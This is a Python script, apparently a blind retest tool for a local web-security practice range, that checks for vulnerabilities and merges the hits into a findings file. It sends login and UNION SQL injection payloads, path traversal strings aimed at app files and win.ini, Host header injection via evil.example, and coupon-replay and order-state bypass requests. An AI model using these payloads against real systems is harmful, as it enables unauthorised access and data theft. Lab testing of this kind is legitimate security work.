"""靶场盲测补充：修正端点假设后重测未命中项，并把结果并入 lab_findings.json。

只用「首页自带的入口链接」+ 常见变体做黑盒修正，不读 LAB-MANIFEST.md。
"""
import json
import pathlib
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
import http.cookiejar

from guard import assert_target_allowed

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:  # noqa: BLE001
    pass

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8095").rstrip("/")
assert_target_allowed(BASE)
UA = "DSH-LabRetry/0.1 (lab-only)"
HERE = pathlib.Path(__file__).resolve().parent


class C:
    def __init__(self):
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    def r(self, path, data=None, headers=None, method=None):
        url = BASE + path
        assert_target_allowed(url)
        body = urllib.parse.urlencode(data).encode() if isinstance(data, dict) else data
        h = {"User-Agent": UA}
        if isinstance(data, dict):
            h["Content-Type"] = "application/x-www-form-urlencoded"
        h.update(headers or {})
        try:
            with self.op.open(urllib.request.Request(url, data=body, headers=h, method=method), timeout=15) as resp:
                return resp.status, resp.read(200_000).decode("utf-8", "replace"), dict(resp.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read(200_000).decode("utf-8", "replace"), dict(e.headers or {})
        except Exception as e:  # noqa: BLE001
            return None, str(e), {}


def csrf(html):
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', html or "")
    return m.group(1) if m else None


out = {}
c = C()

# --- 先确定"登录成功"的判据：登录后首页应出现登出/用户名 ---
c.r("/login")
s, b, _ = c.r("/login", {"username": "admin", "password": "admin123", "csrf_token": csrf(c.r("/login")[1])})
shome, bhome, _ = c.r("/")
signed = any(k in bhome for k in ("退出", "logout", "admin"))
print(f"[基线] 登录后首页出现身份标志 = {signed}（HTTP {shome}）")

# C1 登录 SQL 注入（用同一判据）
c1 = C()
h = c1.r("/login")[1]
c1.r("/login", {"username": "x' OR '1'='1' -- ", "password": "x", "csrf_token": csrf(h)})
_, bh, _ = c1.r("/")
out["C1"] = {"hit": any(k in bh for k in ("退出", "logout")), "ev": "SQL 注入后首页出现身份标志"}
print(f"[C1] 登录 SQL 注入绕过 -> 命中={out['C1']['hit']}")

# C2 查询接口注入：报错型 + UNION 变体
hit2, ev2 = False, ""
for q in ["'", "' OR '1'='1", "x' UNION SELECT 1,2,3,4,5,6-- ", "x' UNION SELECT 1,username,3,4,5,6 FROM users-- "]:
    s, b, _ = c.r("/api/search?q=" + urllib.parse.quote(q))
    if s == 500 or "sqlite" in (b or "").lower() or "syntax" in (b or "").lower():
        hit2, ev2 = True, f"payload={q!r} → HTTP {s}（数据库错误）"
        break
    if re.search(r"[0-9a-f]{32,}", b or ""):
        hit2, ev2 = True, f"payload={q!r} → 响应出现哈希/敏感数据"
        break
out["C2"] = {"hit": hit2, "ev": ev2 or "各载荷均无异常"}
print(f"[C2] 查询接口 SQL 注入 -> 命中={hit2} {ev2[:60]}")

# C5 路径穿越：首页自带 file=app.py + 多级变体
hit5, ev5 = False, ""
for f in ["app.py", "config.bak", "../app.py", "../../app.py", "..%2fapp.py", "....//app.py",
          "C:\\Windows\\win.ini", "..\\..\\Windows\\win.ini"]:
    s, b, _ = c.r("/download?file=" + urllib.parse.quote(f))
    if s == 200 and ("import " in (b or "") or "[fonts]" in (b or "") or "SECRET" in (b or "")):
        hit5, ev5 = True, f"file={f!r} → HTTP 200 泄露内容"
        break
out["C5"] = {"hit": hit5, "ev": ev5 or "各变体均未读到文件"}
print(f"[C5] 路径穿越 -> 命中={hit5} {ev5[:60]}")

# E2 Host 头注入：首页链接是 /forgot?username=admin
hitE, evE = False, ""
for path in ["/forgot?username=admin", "/reset-password", "/forgot"]:
    for hd in ({"X-Forwarded-Host": "evil.example"}, {"Host": "evil.example"}):
        s, b, _ = c.r(path, headers=hd)
        if "evil.example" in (b or ""):
            hitE, evE = True, f"{path} + {list(hd)[0]}: evil.example → 被反射"
            break
    if hitE:
        break
out["E2"] = {"hit": hitE, "ev": evE or "未反射外来 Host"}
print(f"[E2] Host 头注入 -> 命中={hitE} {evE[:60]}")

# G3 优惠券重复领取：带 code 参数
hit3, ev3 = False, ""
for path in ["/coupon/claim?code=WELCOME10", "/coupon/claim?code=WELCOME10&code=WELCOME10",
             "/claim?code=WELCOME10", "/coupon?code=WELCOME10"]:
    s1, b1, _ = c.r(path)
    s2, b2, _ = c.r(path)
    if s1 in (200, 302) and s2 in (200, 302):
        hit3, ev3 = True, f"{path} 两次都成功（HTTP {s1}/{s2}）→ 无幂等校验"
        break
out["G3"] = {"hit": hit3, "ev": ev3 or "各路径均未成功领取两次"}
print(f"[G3] 优惠券重复领取 -> 命中={hit3} {ev3[:60]}")

# G5 状态机绕过：多路径变体
hit5g, ev5g = False, ""
for path in ["/order/status?state=shipped&id=1", "/order/status?id=1&state=shipped",
             "/order/ship?id=1", "/order?id=1&state=shipped", "/order/state?id=1&state=shipped"]:
    s, b, _ = c.r(path)
    if s in (200, 302) and ("ship" in (b or "").lower() or "已发货" in (b or "") or "shipped" in (b or "").lower()):
        hit5g, ev5g = True, f"{path} → HTTP {s} 状态被改"
        break
out["G5"] = {"hit": hit5g, "ev": ev5g or "各变体均未成功改状态"}
print(f"[G5] 状态机绕过 -> 命中={hit5g} {ev5g[:60]}")

# H1 traceback 回显：宽松判据
s, b, _ = c.r("/api/search?q=" + urllib.parse.quote("'"))
low = (b or "").lower()
hitH = any(k in low for k in ("traceback", "sqlite3.", "operationalerror", "line ", "file \""))
out["H1"] = {"hit": hitH, "ev": f"错误页含实现细节={hitH}（HTTP {s}）"}
print(f"[H1] traceback 回显 -> 命中={hitH}")

# --- 并入 lab_findings.json ---
fp = HERE / "lab_findings.json"
data = json.loads(fp.read_text(encoding="utf-8"))
idx = {d["id"]: d for d in data}
for vid, r in out.items():
    if vid in idx:
        if r["hit"]:
            idx[vid]["hit"] = True
            idx[vid]["evidence"] = (r["ev"] + " | 原始: " + idx[vid]["evidence"])[:220]
    else:
        data.append({"id": vid, "cat": "补充", "name": vid, "hit": r["hit"], "evidence": r["ev"], "note": "端点修正后重测"})
fp.write_text(json.dumps(data, ensure_ascii=False, indent=1), encoding="utf-8")
print(f"\n已并入 {fp.name}：现在命中 {len([d for d in data if d['hit']])}/{len(data)}")
